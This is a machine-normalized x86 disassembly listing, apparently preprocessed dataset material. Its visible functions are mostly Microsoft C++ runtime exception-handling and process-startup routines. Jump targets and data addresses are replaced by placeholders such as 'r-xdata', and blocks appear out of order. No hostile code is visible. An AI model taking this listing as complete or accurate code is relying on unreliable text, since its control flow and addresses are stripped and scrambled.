mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40e250
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_4093ac
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_4093ac
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_40e29c
push 0x8
push r--data
call sub_4021d0
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_402215
retn
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
test [ ecx ] 0x10
je r-xdata
and [ ebp - 0x4 ] 0x0
push edx
push [ eax + 0x18 ]
call sub_40df94
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
mov eax [ eax + 0x18 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
sub_40e34d
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_402a22
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_402bcd
pop ecx
sub_40e372
push 0x30
push r--data
call sub_4021d0
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov edi [ ebp + 0xc ]
mov eax [ edi - 0x4 ]
mov [ ebp - 0x28 ] eax
mov esi [ ebp + 0x8 ]
push [ esi + 0x18 ]
lea eax [ ebp - 0x40 ]
push eax
call sub_40e177
pop ecx
pop ecx
mov [ ebp - 0x2c ] eax
call sub_40638a
mov eax [ eax + 0x88 ]
mov [ ebp - 0x30 ] eax
call sub_40638a
mov eax [ eax + 0x8c ]
mov [ ebp - 0x34 ] eax
call sub_40638a
mov [ eax + 0x88 ] esi
call sub_40638a
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
mov [ ebp - 0x4 ] ebx
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_40df34
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_40e4b9
mov eax edi
call sub_402215
retn
sub_40e411
mov esp [ ebp - 0x18 ]
call sub_40638a
xor ebx ebx
mov [ eax + 0x3ac ] ebx
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ edx + 0x4 ] 0x80
jg r-xdata
mov eax [ edi + 0x8 ]
movsx eax [ edi + 0x8 ]
jmp r-xdata
push eax
push edx
push ebx
push edi
call sub_40ee44
add esp 0x10
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_40e4b9
mov eax edi
call sub_402215
retn
imul edi ecx 0x14
mov [ ebp + 0x18 ] edi
cmp eax [ edi + esi + 0x4 ]
mov edi [ ebp + 0xc ]
jle r-xdata
mov [ ebp - 0x20 ] eax
mov esi [ edx + 0x10 ]
mov ecx ebx
mov [ ebp - 0x24 ] ecx
cmp [ edx + 0xc ] ecx
jbe r-xdata
inc ecx
mov [ ebp - 0x24 ] ecx
cmp ecx [ edx + 0xc ]
jb r-xdata
mov edi [ ebp + 0x18 ]
cmp eax [ edi + esi + 0x8 ]
mov edi [ ebp + 0xc ]
jg r-xdata
imul eax ecx 0x14
mov eax [ eax + esi + 0x4 ]
inc eax
mov [ ebp - 0x20 ] eax
mov ecx [ edx + 0x8 ]
mov eax [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
sub_40e4b9
mov eax [ ebp - 0x28 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x2c ]
call sub_40e1a1
pop ecx
call sub_40638a
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x88 ] ecx
call sub_40638a
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
mov edi [ ebp - 0x1c ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
mov edi [ ebp - 0x1c ]
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
retn
test edi edi
je r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_40e1f1
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_40e29c
pop ecx
pop ecx
jmp r-xdata
sub_40e578
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push edi
push [ ebp + 0x8 ]
call sub_40eba6
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop ebp
retn
push edi
push eax
call sub_40e0f0
call sub_40e122
push esi
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_40ee44
mov eax [ esi + 0x4 ]
inc eax
push 0x100
push [ ebp + 0x28 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp + 0x1c ]
push [ eax + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_40e372
add esp 0x2c
pop esi
test eax eax
je r-xdata
sub_40e5f3
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
call sub_40638a
xor ecx ecx
inc ecx
mov [ eax + 0x3ac ] ecx
mov eax ecx
pop ebp
retn
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
sub_40e640
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
xor ebx ebx
mov [ ebp - 0x24 ] bl
mov [ ebp - 0x1 ] bl
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov eax [ eax + 0x8 ]
movsx eax [ eax + 0x8 ]
jmp r-xdata
call sub_403520
cmp eax [ edi + 0x4 ]
jl r-xdata
mov [ ebp - 0x8 ] eax
cmp eax 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0xe06d7363
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_40638a
cmp [ eax + 0x94 ] ebx
je r-xdata
cmp [ ebp + 0x1c ] bl
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403520
call sub_403558
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push esi
call sub_40e9dd
add esp 0x20
cmp [ esi ] 0xe06d7363
jne r-xdata
cmp [ esi + 0x1c ] ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0xc ] ebx
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_40638a
cmp [ eax + 0x88 ] ebx
je r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
call sub_40638a
mov esi [ eax + 0x88 ]
call sub_40638a
push 0x1
push esi
mov [ ebp - 0x24 ] 0x1
mov eax [ eax + 0x8c ]
mov [ ebp + 0x8 ] eax
call sub_40f065
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ edi + 0xc ] ebx
jbe r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ esi ] 0xe06d7363
jne r-xdata
call sub_403520
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_40e072
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x28 ]
jae r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
call sub_40638a
cmp [ eax + 0x94 ] ebx
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_40e29c
pop ecx
pop ecx
lea edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0x8 ]
call sub_40638a
mov eax [ eax + 0x94 ]
mov [ ebp - 0x14 ] eax
call sub_40638a
push [ ebp - 0x14 ]
push esi
mov [ eax + 0x94 ] ebx
call sub_40eaf9
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc ecx
add edx 0x14
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] edx
cmp ecx [ ebp - 0x28 ]
jb r-xdata
cmp eax [ edx - 0xc ]
jg r-xdata
mov edi [ ebp - 0x14 ]
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0x1c ] 0x0
je r-xdata
lea ebx [ edx - 0x10 ]
mov [ ebp - 0x2c ] ebx
mov ebx [ ebp + 0xc ]
cmp [ edx - 0x10 ] eax
jg r-xdata
xor ebx ebx
mov edi [ edx ]
mov [ ebp - 0xc ] edi
mov edi [ edx - 0x4 ]
test edi edi
mov [ ebp - 0x20 ] edi
mov edi [ ebp + 0x18 ]
jle r-xdata
mov eax ebx
mov [ ebp + 0x18 ] ebx
call sub_403520
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
push [ edi + 0x1c ]
push esi
call sub_40eaf9
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx [ ebp - 0xc ]
push 0x1
push esi
call sub_40e29c
pop ecx
pop ecx
lea eax [ ebp + 0x18 ]
mov [ ebp + 0x18 ] r--data
push eax
lea ecx [ ebp - 0x3c ]
call sub_4029bf
push r--data
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x3c ] r--data
push eax
call sub_402b1f
mov eax [ ebp + 0x18 ]
inc ebx
add eax 0x10
mov [ ebp + 0x18 ] eax
cmp ebx [ edi ]
jl r-xdata
call sub_40638a
call sub_40638a
call sub_40638a
mov [ eax + 0x88 ] esi
call sub_40638a
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x8 ]
push esi
mov [ eax + 0x8c ] ecx
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] edx
test eax eax
jg r-xdata
mov ecx [ edi + 0x4 ]
push rw-data
mov ecx [ eax + ecx + 0x4 ]
call sub_402b90
test al al
jne r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
push [ esi + 0x1c ]
mov eax [ edx ]
push eax
push ecx
mov [ ebp - 0x30 ] eax
call sub_40effe
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x20 ]
add ecx 0x10
dec eax
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x20 ] eax
test eax eax
jg r-xdata
call sub_40e122
push 0xffffffff
push edi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_40ee44
add esp 0x10
push [ edi + 0x1c ]
call sub_40e538
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x2c ]
push [ ebp - 0x30 ]
push [ ebp - 0xc ]
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
push ebx
push esi
call sub_40e578
add esp 0x2c
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
dec eax
mov ecx [ ebp - 0xc ]
add edx 0x4
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edx [ eax + 0x4 ]
mov eax [ eax ]
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x10 ]
sub_40e9dd
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x80000003
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push ebx
push esi
call sub_40638a
mov ebx [ ebp + 0x18 ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
push 0x0
call [ EncodePointer@IAT ]
mov esi eax
call sub_40638a
cmp [ eax + 0x80 ] esi
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x1c ]
push [ ebp + 0x20 ]
push ebx
call sub_40e072
mov ecx [ ebp - 0x8 ]
add esp 0x14
mov edx [ ebp - 0x4 ]
cmp ecx edx
jae r-xdata
call sub_403520
cmp [ edi ] 0xe0434f4d
je r-xdata
pop esi
pop ebx
lea esi [ eax + 0xc ]
mov eax [ ebp + 0x1c ]
cmp [ edi ] 0xe0434352
je r-xdata
inc ecx
add esi 0x14
mov [ ebp - 0x8 ] ecx
cmp ecx edx
jb r-xdata
cmp eax [ esi - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_40df9b
add esp 0x1c
test eax eax
jne r-xdata
cmp eax [ esi - 0xc ]
jl r-xdata
mov eax [ esi ]
mov edi [ esi + 0x4 ]
shl eax 0x4
mov edi [ edi + eax - 0xc ]
test edi edi
je r-xdata
mov edi [ esi + 0x4 ]
add edi 0xfffffff0
add eax edi
mov edi [ ebp + 0x8 ]
test [ eax ] 0x40
jne r-xdata
mov edx [ esi + 0x4 ]
mov ebx [ edx + eax - 0xc ]
mov edx [ ebp - 0x4 ]
cmp [ ebx + 0x8 ] 0x0
mov ebx [ ebp + 0x18 ]
jne r-xdata
mov eax [ ebp + 0x1c ]
push 0x1
push [ ebp + 0x24 ]
lea ecx [ esi - 0xc ]
push [ ebp + 0x20 ]
push ecx
push 0x0
push eax
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_40e578
mov edx [ ebp - 0x4 ]
add esp 0x2c
mov ecx [ ebp - 0x8 ]
sub_40eaf9
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
je r-xdata
call sub_403520
xor ebx ebx
mov edi ebx
cmp [ esi ] ebx
jle r-xdata
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov ecx ebx
mov [ ebp + 0xc ] ebx
inc edi
add ecx 0x10
mov [ ebp + 0xc ] ecx
cmp edi [ esi ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push [ eax + 0x1c ]
mov eax [ esi + 0x4 ]
push [ edx ]
add eax ecx
push eax
call sub_40effe
mov ecx [ ebp + 0xc ]
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
lea edx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
test eax eax
jle r-xdata
mov bl 0x1
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
dec eax
add edx 0x4
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] edx
test eax eax
jg r-xdata
jmp r-xdata
sub_40eb81
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
mov eax [ ecx ]
mov esi [ ecx + 0x4 ]
add eax edx
test esi esi
js r-xdata
pop esi
pop ebp
retn
mov ecx [ ecx + 0x8 ]
mov edx [ esi + edx ]
mov ecx [ edx + ecx ]
add ecx esi
add eax ecx
sub_40eba6
push 0x8
push r--data
call sub_4021d0
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
test [ edx ] 0x80000000
je r-xdata
lea edi [ ecx + 0xc ]
add edi [ edx + 0x8 ]
mov edi ecx
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40eb81
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_40df94
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push edx
push ecx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_40ec34
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_402215
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40eb81
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_40df94
jmp r-xdata
sub_40ec34
push 0xc
push r--data
call sub_4021d0
xor ebx ebx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] bl
je r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ eax ]
mov edi [ ebp + 0xc ]
test ecx ecx
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x14 ]
test cl cl
jns r-xdata
add edi 0xc
add edi edx
push 0x1
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test cl 0x8
je r-xdata
test [ esi ] 0x10
je r-xdata
test [ esi ] 0x1
je r-xdata
call sub_40f065
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
call sub_40f065
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_403520
push 0x1
push edi
call sub_40f065
pop ecx
pop ecx
test eax eax
je r-xdata
call eax
mov [ ebp + 0x10 ] eax
push 0x1
push eax
call sub_40f065
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40f065
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40f065
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_40f065
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
jmp r-xdata
push 0x1
push edi
call sub_40f065
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_40f065
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_40f065
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push edi
call sub_40c4e0
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
mov [ edi ] ecx
lea eax [ esi + 0x8 ]
push eax
push ecx
mov ecx [ ebp + 0x10 ]
push [ esi + 0x18 ]
call sub_40f065
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
lea eax [ esi + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_40eb81
pop ecx
pop ecx
push eax
push edi
call sub_40c4e0
add esp 0xc
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax ebx
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
test [ esi ] 0x4
push 0x0
pop ebx
setne bl
inc ebx
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_402215
retn
lea eax [ esi + 0x8 ]
push eax
push [ edi ]
jmp r-xdata
call sub_40eb81
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_40edf6
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe0434352
je r-xdata
call sub_40638a
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp [ eax ] 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_40638a
dec [ eax + 0x90 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
call sub_40638a
and [ eax + 0x90 ] 0x0
jmp sub_403558
sub_40ee44
push 0x10
push r--data
call sub_4021d0
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x4 ] 0x80
mov eax [ ebp + 0x8 ]
jg r-xdata
mov esi [ eax + 0x8 ]
movsx esi [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ef03
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_40638a
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] esi
call sub_402215
retn
call sub_403520
call sub_403520
mov eax [ ebp + 0x10 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x8 ]
mov edx [ eax + esi * 8 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] 0x1
cmp [ eax + esi * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] edx
push 0x103
push eax
mov eax [ ecx + 0x8 ]
push [ eax + esi * 8 + 0x4 ]
call sub_40e250
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_40ef1d
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_40638a
mov ecx [ ebp + 0x18 ]
xor esi esi
mov edx [ ebp + 0x8 ]
mov ebx 0xe06d7363
mov edi 0x19930522
cmp [ eax + 0x3ac ] esi
jne r-xdata
test [ edx + 0x4 ] 0x66
je r-xdata
cmp [ edx ] ebx
je r-xdata
cmp [ ecx + 0xc ] esi
jne r-xdata
cmp [ ecx + 0x4 ] esi
je r-xdata
cmp [ edx ] 0x80000026
je r-xdata
cmp [ edx ] ebx
jne r-xdata
mov eax [ ecx ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] esi
jne r-xdata
mov eax [ ecx ]
and eax 0x1fffffff
cmp eax edi
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call sub_40e640
add esp 0x20
cmp [ edx + 0x10 ] 0x3
jb r-xdata
cmp [ ecx + 0x1c ] esi
je r-xdata
push 0xffffffff
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_40ee44
add esp 0x10
jmp r-xdata
test [ ecx + 0x20 ] 0x1
jne r-xdata
cmp [ edx + 0x14 ] edi
jbe r-xdata
mov eax [ edx + 0x1c ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x24 ]
movzx eax al
push eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call esi
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40effe
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea ecx [ eax + 0x8 ]
cmp [ ecx ] 0x0
je r-xdata
test [ esi ] 0x80
mov edi [ ebp + 0xc ]
je r-xdata
mov edx [ edi + 0x4 ]
cmp eax edx
je r-xdata
test [ edi ] 0x10
jne r-xdata
test [ edi ] 0x2
je r-xdata
lea eax [ edx + 0x8 ]
push eax
push ecx
call sub_408720
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
test [ eax ] 0x1
je r-xdata
test [ esi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test [ eax ] 0x2
je r-xdata
test [ esi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ esi ] 0x2
je r-xdata
sub_40f074
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_401000
push 0x208
push rw-data
push 0x0
call [ GetModuleFileNameW@IAT ]
push r-xdata
call sub_401885
pop ecx
retn
sub_4017c7
call sub_401b0c
retn
sub_401885
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_401789
neg eax
pop ecx
sbb eax eax
neg eax
dec eax
pop ebp
retn
sub_40189a
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4027a6
add esp 0x14
pop ebp
retn
sub_4018b6
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_4029ff
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4018d1
mov [ ecx ] r--data
jmp sub_402a22
j_sub_402bcd
jmp sub_402bcd
sub_40198b
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_401957
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_4019bd
push 0x1
push 0x1
push 0x0
call sub_401b15
add esp 0xc
retn
sub_4019cc
push 0x1
push 0x0
push 0x0
call sub_401b15
add esp 0xc
retn
sub_401a5f
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_401b15
add esp 0xc
pop ebp
retn
sub_401b03
push 0x8
call sub_402c45
pop ecx
retn
sub_401b0c
push 0x8
call sub_402daf
pop ecx
retn
sub_401c2f
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_402daf
pop ecx
sub_401c44
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_401b15
add esp 0xc
pop ebp
retn
sub_401c58
mov ecx [ rw-data ]
xor eax eax
or ecx 0x1
cmp [ rw-data ] ecx
sete al
retn
sub_401d09
call sub_4040b2
add eax 0x20
push eax
push 0x1
call sub_404161
pop ecx
pop ecx
retn
sub_401df7
push esi
call sub_404127
pop ecx
retn
sub_401f12
mov ecx [ ebp - 0x14 ]
mov eax [ ecx ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
push ecx
push eax
call sub_4065a6
pop ecx
pop ecx
retn
sub_401f26
mov esp [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_4019bd
push esi
call sub_401a5f
sub_401f40
mov [ ebp - 0x4 ] 0xfffffffe
mov eax esi
call sub_402215
retn
sub_401f4f
push ebp
mov ebp esp
cmp [ rw-data ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
call sub_403202
push 0xff
call sub_40198b
call sub_4031a5
_start
call sub_406d36
jmp sub_401dff
sub_402215
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_4024e9
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4029e4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] r--data
mov eax [ eax ]
mov [ ecx + 0x4 ] eax
mov eax ecx
mov [ ecx + 0x8 ] 0x0
pop ebp
retn 0x8
sub_402a22
mov [ ecx ] r--data
jmp sub_402ac3
sub_402ac3
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
